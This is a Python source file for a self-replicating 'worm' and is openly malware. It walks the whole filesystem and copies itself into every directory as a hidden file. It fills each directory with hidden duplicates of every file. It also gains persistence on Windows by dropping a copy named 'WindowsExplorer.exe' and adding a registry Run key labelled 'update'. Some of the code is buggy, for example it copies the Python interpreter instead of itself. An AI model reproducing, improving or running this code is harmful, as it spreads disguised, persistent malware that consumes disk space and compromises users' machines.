import os
import shutil
import sys
import subprocess


class Worm:

    def __init__(self, path=None, tar_dir=None, num_of_copies=None):
        # path to start looking for directories
        if isinstance(path, type(None)):
            self.path = "/"
        else:
            self.path = path
        # list of target directories
        if isinstance(tar_dir, type(None)):
            self.tar_dir = []
        else:
            self.tar_dir = tar_dir
        # number of copies that will be created
        if isinstance(tar_dir, type(None)):
            self.num_of_copies = 2
        else:
            self.num_of_copies = num_of_copies

        # gets own absolute path
        self.own_path = os.path.realpath(__file__)

    # lists all target directories and subdirectories
    def list_dir(self, path):
        self.tar_dir.append(path)
        current_dir_files = os.listdir(path)

        for file in current_dir_files:
            # ignore hidden files
            if not file.startswith('.'):
                absolute_path = os.path.join(path, file)
                print(absolute_path)

                if os.path.isdir(absolute_path):
                    self.list_dir(absolute_path)
                else:
                    pass

    # Replicates the worm
    def replicate_worm(self):
        for directory in self.tar_dir:
            dest = os.path.join(directory, ".worm.py")
            shutil.copyfile(sys.executable, dest)

    # Copies targeted files in a specified location
    def duplicate_target_files(self):
        for directory in self.tar_dir:
            files_in_dir = os.listdir(directory)
            for file in files_in_dir:
                abs_path = os.path.join(directory, file)
                if not abs_path.startswith('.') and not os.path.isdir(abs_path):
                    source = abs_path
                    for i in range(self.num_of_copies):
                        dest = os.path.join(directory, ("."+file+str(i)))
                        shutil.copyfile(source, dest)
                        print(directory)

    def persistence(self):
        evil_file_location = os.environ["Public"] + "\\WindowsExplorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call(
               'REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"',
               shell=True)

    def run(self):
        self.persistence()
        self.list_dir(self.path)
        self.replicate_worm()
        self.duplicate_target_files()

